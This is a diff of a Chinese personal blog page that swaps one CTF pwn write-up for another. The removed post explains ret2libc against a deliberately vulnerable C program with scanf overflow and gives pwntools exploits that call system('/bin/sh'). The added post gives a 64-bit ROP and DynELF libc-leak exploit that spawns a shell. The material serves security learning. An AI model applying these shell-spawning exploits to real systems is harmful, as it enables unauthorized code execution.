@@ -6,18 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>PWN_x86—2_ret2blic | ESE</title>
+  <title>PWN | ESE</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–CTF中的简单ret2blic">
+  <meta name="description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点 为了入群做题">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PWN_x86—2_ret2blic">
-<meta property="og:url" content="http://yoursite.com/2017/09/19/pwn2/index.html">
+<meta property="og:title" content="PWN">
+<meta property="og:url" content="http://yoursite.com/2017/11/03/pwn_ruqun/index.html">
 <meta property="og:site_name" content="ESE">
-<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–CTF中的简单ret2blic">
-<meta property="og:updated_time" content="2017-10-05T09:43:04.178Z">
+<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点 为了入群做题">
+<meta property="og:updated_time" content="2017-11-03T07:24:14.603Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PWN_x86—2_ret2blic">
-<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–CTF中的简单ret2blic">
+<meta name="twitter:title" content="PWN">
+<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点 为了入群做题">
   
   
     <link rel="icon" href="/favicon.png">
@@ -159,41 +159,34 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-pwn2" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-pwn_ruqun" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      PWN_x86—2_ret2blic
+      PWN
     </h1>
   
 
         
-        <a href="/2017/09/19/pwn2/" class="archive-article-date">
-  	<time datetime="2017-09-19T10:08:08.505Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-19</time>
+        <a href="/2017/11/03/pwn_ruqun/" class="archive-article-date">
+  	<time datetime="2017-11-03T07:11:56.346Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-03</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>记录每天的进步，只有努力不会背叛自己！每天学习一点PWN</p>
-<h1 id="PWN从开始到开始–CTF中的简单ret2blic"><a href="#PWN从开始到开始–CTF中的简单ret2blic" class="headerlink" title="PWN从开始到开始–CTF中的简单ret2blic"></a>PWN从开始到开始–CTF中的简单ret2blic</h1><a id="more"></a>
-<h2 id="1、何为ret2blic"><a href="#1、何为ret2blic" class="headerlink" title="1、何为ret2blic"></a>1、何为ret2blic</h2><p>通过返回地址或者函数的plt跳到我们需要执行的函数，从而达到我们想要的，一般都是得到shell</p>
-<h2 id="2、源码"><a href="#2、源码" class="headerlink" title="2、源码"></a>2、源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;string.h&gt;</span></div><div class="line"><span class="comment">#include &lt;unistd.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></div><div class="line">char *shell = <span class="string">"/bin/sh"</span>;</div><div class="line">void <span class="function"><span class="title">grant</span></span>() &#123;</div><div class="line">   system(<span class="string">"Good job"</span>);</div><div class="line">&#125;</div><div class="line">void <span class="function"><span class="title">exploitable</span></span>() &#123;</div><div class="line">   char buffer[16];</div><div class="line">   scanf(<span class="string">"%s"</span>, buffer);</div><div class="line">   <span class="keyword">if</span>(strcmp(buffer,<span class="string">"pwned"</span>) == 0) grant();</div><div class="line">   <span class="keyword">else</span>  puts(<span class="string">"Nice try\n"</span>);</div><div class="line">&#125;</div><div class="line">int <span class="function"><span class="title">main</span></span>()&#123;</div><div class="line">   exploitable();</div><div class="line">   <span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>运行命令生成<br><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o pwn1 pwn1.c</code></p>
-<h2 id="3、漏洞原理，利用ret2blic技术"><a href="#3、漏洞原理，利用ret2blic技术" class="headerlink" title="3、漏洞原理，利用ret2blic技术"></a>3、漏洞原理，利用ret2blic技术</h2><p>ida打开，查看grant函数 汇编代码如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">.text:080484CB grant           proc near               ; CODE XREF: </div><div class="line">.text:080484CB</div><div class="line">.text:080484CB var_4           = dword ptr -4</div><div class="line">.text:080484CB</div><div class="line">.text:080484CB                 push    ebp</div><div class="line">.text:080484CC                 mov     ebp, esp</div><div class="line">.text:080484CE                 push    ebx</div><div class="line">.text:080484CF                 sub     esp, 4</div><div class="line">.text:080484D2                 call    __x86_get_pc_thunk_ax</div><div class="line">.text:080484D7                 add     eax, 1B29h</div><div class="line">.text:080484DC                 sub     esp, 0Ch</div><div class="line">.text:080484DF                 lea     edx, (aGoodJob - 804A000h)[eax] ; <span class="string">"Good job"</span></div><div class="line">.text:080484E5                 push    edx             ; <span class="built_in">command</span></div><div class="line">.text:080484E6                 mov     ebx, eax</div><div class="line">.text:080484E8                 call    _system</div><div class="line">.text:080484ED                 add     esp, 10h</div><div class="line">.text:080484F0                 nop</div><div class="line">.text:080484F1                 mov     ebx, [ebp+var_4]</div><div class="line">.text:080484F4                 leave</div><div class="line">.text:080484F5                 retn</div><div class="line">.text:080484F5 grant           endp</div></pre></td></tr></table></figure></p>
-<p>这里可以理解为<br><code>system(command)</code><br>最后ret，将保存的 函数返回地址从堆栈的顶部pop出值到EIP。<br>而我们想要得到shell，就得将command改为“bin/sh”，即<br><code>system(&quot;bin/sh&quot;)</code></p>
-<p>从ida我们看到“/bin/sh”的地址0x8048610<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">.rodata:08048610 aBinSh          db <span class="string">'/bin/sh'</span>,0          ; DATA XREF: .</div><div class="line">.rodata:08048618 aGoodJob        db <span class="string">'Good job'</span>,0         ; DATA XREF: </div><div class="line">.rodata:08048621 aS              db <span class="string">'%s'</span>,0               ; DATA XREF: </div><div class="line">.rodata:08048624 aPwned          db <span class="string">'pwned'</span>,0            ; DATA XREF: </div><div class="line">.rodata:0804862A aNiceTry        db <span class="string">'Nice try'</span>,0Ah,0     ; DATA XREF: </div><div class="line">.rodata:0804862A _rodata         ends</div></pre></td></tr></table></figure></p>
-<p>从ida我们看到system_plt的地址0x8048390<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">.plt:08048390 ; int system(const char *<span class="built_in">command</span>)</div><div class="line">.plt:08048390 _system         proc near               ; CODE XREF: </div><div class="line">.plt:08048390                 jmp     ds:off_804A014</div><div class="line">.plt:08048390 _system         endp</div></pre></td></tr></table></figure></p>
-<p>我们构造一个“假”的堆栈结构，然后修改函数的返回地址:</p>
-<p><code>payload=&#39;a&#39;*28+p32(system_plt)+p32(1)+p32(sh_addr)</code></p>
-<p>p32(system_plt):原函数的返回地址，这里改为我们要执行的system的地址<br>p32(1):system的返回地址，因为用不到，这里我随便填的。<br>p32(sh_addr):system的第一个参数，要执行字符串的地址，我们要拿到shell,就填’/bin/sh’的地址</p>
-<h2 id="4、exp"><a href="#4、exp" class="headerlink" title="4、exp"></a>4、exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p = process(<span class="string">'./pwn1'</span>)</div><div class="line"><span class="comment">#gdb.attach(p,'''break main''')</span></div><div class="line">system_plt=0x8048390</div><div class="line">sh_addr=0x8048610</div><div class="line">payload=<span class="string">'a'</span>*28+p32(system_plt)+p32(1)+p32(sh_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-<p>记录一下字节走的坑：<br>后面发现system_plt等等许多plt是不能用ida看到出来的,上面也许是巧合<br>要写会用system_plt=elf.symbols[‘system’]</p>
-<h2 id="5、改善的exp"><a href="#5、改善的exp" class="headerlink" title="5、改善的exp"></a>5、改善的exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p = process(<span class="string">'./pwn1'</span>)</div><div class="line">elf = ELF(<span class="string">'pwn1'</span>)</div><div class="line">system_plt=elf.symbols[<span class="string">'system'</span>]</div><div class="line">sh_addr=0x8048610</div><div class="line">payload=<span class="string">'a'</span>*28+p32(system_plt)+p32(1)+p32(sh_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+        <p>记录每天的进步，只有努力不会背叛自己！每天学习一点</p>
+<h1 id="为了入群做题"><a href="#为了入群做题" class="headerlink" title="为了入群做题"></a>为了入群做题</h1><a id="more"></a>
+<h2 id="1、入群"><a href="#1、入群" class="headerlink" title="1、入群"></a>1、入群</h2><p>链接：<a href="http://pan.baidu.com/s/1qY4wyoW" target="_blank" rel="external">http://pan.baidu.com/s/1qY4wyoW</a> 密码：46d4<br>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf=ELF(&apos;pwn&apos;)</div><div class="line">get_got = elf.got[&apos;fgets&apos;]</div><div class="line">puts_plt = elf.plt[&apos;puts&apos;]</div><div class="line">puts_got = elf.got[&apos;puts&apos;]</div><div class="line">main = elf.symbols[&apos;main&apos;]</div><div class="line"></div><div class="line">bss = 0x6020b0</div><div class="line">ppprdi=0x401ab0</div><div class="line">        </div><div class="line">p = process(&apos;pwn&apos;)</div><div class="line">p.recvuntil(&apos;&gt; &apos;)</div><div class="line">#gdb.attach(p,&apos;&apos;&apos;b *0x4019ea &apos;&apos;&apos;)</div><div class="line"></div><div class="line">def peek(addr):</div><div class="line">    rop = p64(ppprdi) +p64(addr) +p64(1)+p64(1) + p64(puts_plt) + p64(main)</div><div class="line">    p.sendline(&apos;A&apos;*40+ rop)</div><div class="line">    str = p.recvuntil(&apos;&gt; &apos;)</div><div class="line">    result = str.split(&apos;\ncallme&apos;)[0]</div><div class="line">    if result == &apos;&apos;:</div><div class="line">        return &apos;\x00&apos;</div><div class="line">    return result</div><div class="line"></div><div class="line">d = DynELF(peek, elf=elf)</div><div class="line">system = int(d.lookup(&apos;system&apos;, &apos;libc&apos;))</div><div class="line">gets = int(d.lookup(&apos;gets&apos;, &apos;libc&apos;))</div><div class="line"></div><div class="line"></div><div class="line">rop = p64(ppprdi) + p64(bss) +p64(1)+p64(1) + p64(gets) + p64(main)</div><div class="line">payload = &quot;A&quot;*40 + rop</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(&apos;/bin/sh\0&apos;)</div><div class="line">p.recvuntil(&apos;&gt; &apos;)</div><div class="line"></div><div class="line">rop=p64(ppprdi) + p64(bss) +p64(1)+p64(1) + p64(system) + p64(0xdeadbeef)</div><div class="line">payload = &quot;A&quot;*40+ rop</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>之后是什么、、、、说好的flag呢？<br>哇还有东西，居然还有都行，居然是.dat文件</p>
+<p>害怕-恐怖</p>
+<p>才想到做题技术大牛说的，不要害怕新的挑战，敢于尝试，</p>
+<p>然后，研究几分钟，发现就很简单算法</p>
+<h2 id="这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心"><a href="#这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心" class="headerlink" title="这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心"></a>这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心</h2>
       
 
       
@@ -277,7 +270,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/09/19/pwn2/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/11/03/pwn_ruqun/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -291,18 +284,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/09/19/pwn3/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          PWN_x86—3_fmt
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/09/19/pwn0_me/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">PWN0——me</div>
+    <a href="/2017/11/01/re_doxc_exe/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">RE_exe_docx</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -330,7 +314,7 @@
   
   <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="pwn2" data-title="PWN_x86—2_ret2blic" data-url="http://yoursite.com/2017/09/19/pwn2/"></div>
+	<div class="ds-thread" data-thread-key="pwn_ruqun" data-title="PWN" data-url="http://yoursite.com/2017/11/03/pwn_ruqun/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
@@ -353,8 +337,8 @@
   <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
 <script>
   var cloudTieConfig = {
-    url: "http://yoursite.com/2017/09/19/pwn2/", 
-    sourceId: "pwn2",
+    url: "http://yoursite.com/2017/11/03/pwn_ruqun/", 
+    sourceId: "pwn_ruqun",
     productKey: "true",
     target: "cloud-tie-wrapper"
   };
@@ -363,7 +347,7 @@
   
 
   
-  <div id="SOHUCS" sid="pwn2" ></div> 
+  <div id="SOHUCS" sid="pwn_ruqun" ></div> 
 <script type="text/javascript"> 
 window.YiliaChangyanWrap = function() {
     var appid = "true"; 
